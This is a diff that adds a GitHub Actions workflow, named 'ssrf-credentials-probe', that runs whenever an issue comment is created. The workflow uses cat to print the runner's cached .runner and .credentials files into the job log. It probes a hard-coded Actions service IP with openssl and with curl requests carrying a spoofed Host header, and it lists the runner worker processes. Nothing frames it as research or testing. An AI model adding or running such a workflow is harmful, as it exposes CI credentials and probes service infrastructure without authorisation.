@@ -1,0 +1,30 @@
+name: ssrf-credentials-probe
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Read runner credentials and probe Actions service IP
+        run: |
+          echo "=== .runner file ==="
+          cat /home/runner/actions-runner/cached/2.334.0/.runner 2>/dev/null || echo "not readable"
+
+          echo ""
+          echo "=== .credentials file ==="
+          cat /home/runner/actions-runner/cached/2.334.0/.credentials 2>/dev/null || echo "not readable"
+
+          echo ""
+          echo "=== Probe 20.75.202.224 (Actions service) ==="
+          echo | openssl s_client -connect 20.75.202.224:443 2>/dev/null | openssl x509 -noout -subject -issuer 2>/dev/null || true
+
+          for path in / /_apis/health /health /status /_apis/pipelines; do
+            code=$(curl -sk --max-time 3 -o /dev/null -w '%{http_code}' "https://20.75.202.224$path" -H "Host: pipelines.actions.githubusercontent.com" 2>/dev/null || true)
+            echo "  $path -> $code"
+          done
+
+          echo ""
+          echo "=== Runner worker process ==="
+          pgrep -a -f "Runner\|Worker\|runner" 2>/dev/null | head -5 || true
